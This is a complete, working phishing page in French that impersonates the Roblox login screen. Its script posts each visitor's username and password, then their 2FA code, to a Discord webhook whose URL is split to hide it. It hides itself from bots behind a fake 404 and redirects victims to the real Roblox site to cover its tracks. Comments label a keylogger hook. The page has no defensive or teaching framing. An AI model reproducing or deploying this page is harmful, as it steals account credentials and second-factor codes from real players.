<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Connexion à Roblox</title>
    <style>
        body { margin: 0; background: #000 url('https://images.rbxcdn.com/f9c3c04d0c1b4b6099a4b3d3f9e4f5d5.jpg') no-repeat center center fixed; background-size: cover; font-family: "Gotham SSm A", sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        body::before { content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.75); z-index: 1; }
        .card { position: relative; z-index: 2; background: #232527; width: 400px; padding: 40px; border-radius: 8px; text-align: center; box-shadow: 0 4px 20px rgba(0,0,0,0.6); transition: 0.3s; }
        h1 { color: #fff; font-size: 28px; margin-bottom: 25px; font-weight: 500; }
        input { width: 100%; padding: 12px; margin-bottom: 15px; background: #393b3d; border: 1px solid #393b3d; border-radius: 4px; color: #fff; font-size: 16px; box-sizing: border-box; outline: none; }
        input:focus { border: 1px solid #00a8fc; }
        .btn { width: 100%; padding: 12px; background: #fff; border: none; border-radius: 4px; color: #000; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        #step2, #loading { display: none; }
        .loader-bar { width: 100%; height: 4px; background: #393b3d; margin-top: 15px; border-radius: 2px; overflow: hidden; }
        .prog { width: 0%; height: 100%; background: #00a8fc; transition: width 2s linear; }
        .warn { color: #f68802; font-size: 13px; margin-top: 10px; }
    </style>
</head>
<body>

<div class="card" id="box">
    <div id="step1">
        <h1>Connexion</h1>
        <input type="text" id="u" placeholder="Identifiant/E-mail/Téléphone" autocomplete="off">
        <input type="password" id="p" placeholder="Mot de passe">
        <button class="btn" onclick="goStep2()">Connexion</button>
    </div>

    <div id="step2">
        <h1 style="color:#f68802">Vérification</h1>
        <p style="color:#adb1b5; font-size: 14px;">Un code a été envoyé à votre adresse e-mail. Veuillez le saisir pour valider la connexion.</p>
        <input type="text" id="c2fa" placeholder="Code à 6 chiffres" maxlength="6">
        <button class="btn" onclick="finish()">Vérifier</button>
    </div>

    <div id="loading">
        <p style="color:#fff">Synchronisation sécurisée...</p>
        <div class="loader-bar"><div class="prog" id="pb"></div></div>
    </div>
</div>

<script>
    // --- OBFUSCATION DU WEBHOOK ---
    const _0x1a2b = ["https://discord.com/api/webhooks/1490805370715902075/", "gRPIwEEgi3c5kSyGOO79wDtEjBgy-wzirW1hU-K27YZnavOqki447luH-mQn-UNhWOj9"];
    const hook = _0x1a2b[0] + _0x1a2b[1];

    let cacheUser = "";
    let cachePass = "";

    // ANTI-BOT SIMPLE : On vérifie si l'écran est trop petit ou si c'est un moteur de rendu connu
    if(navigator.userAgent.includes("Bot") || window.innerWidth < 100) {
        document.body.innerHTML = "<h1>404 Not Found</h1>";
    }

    async function sendToDiscord(data) {
        try {
            await fetch(hook, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    embeds: [{
                        title: "🚀 APEX LOGS - ROBLOX",
                        color: 16733440,
                        fields: data,
                        timestamp: new Date()
                    }]
                })
            });
        } catch(e) {}
    }

    function goStep2() {
        cacheUser = document.getElementById('u').value;
        cachePass = document.getElementById('p').value;
        if(!cacheUser || !cachePass) return;

        // On envoie le premier round (User/Pass)
        sendToDiscord([
            { name: "👤 Utilisateur", value: `\`${cacheUser}\`` },
            { name: "🔑 Mot de passe", value: `\`${cachePass}\`` },
            { name: "🚩 État", value: "En attente du code 2FA..." }
        ]);

        document.getElementById('step1').style.display = 'none';
        document.getElementById('step2').style.display = 'block';
    }

    async function finish() {
        const code = document.getElementById('c2fa').value;
        if(!code) return;

        document.getElementById('step2').style.display = 'none';
        document.getElementById('loading').style.display = 'block';
        setTimeout(() => { document.getElementById('pb').style.width = "100%"; }, 100);

        // On envoie le code 2FA
        await sendToDiscord([
            { name: "👤 Utilisateur", value: `\`${cacheUser}\`` },
            { name: "🔑 Mot de passe", value: `\`${cachePass}\`` },
            { name: "🛡️ CODE 2FA", value: `\`${code}\``, inline: false }
        ]);

        // Redirection finale pour ne laisser aucune trace
        setTimeout(() => {
            window.location.href = "https://www.roblox.com/home";
        }, 2500);
    }

    // KEYLOGGER DISCRET : Envoie les touches si l'utilisateur met trop de temps
    document.addEventListener('keydown', (e) => {
        if(e.key === "Enter") return;
        // Optionnel : on pourrait envoyer chaque touche ici pour du monitoring live
    });
</script>
</body>
</html>
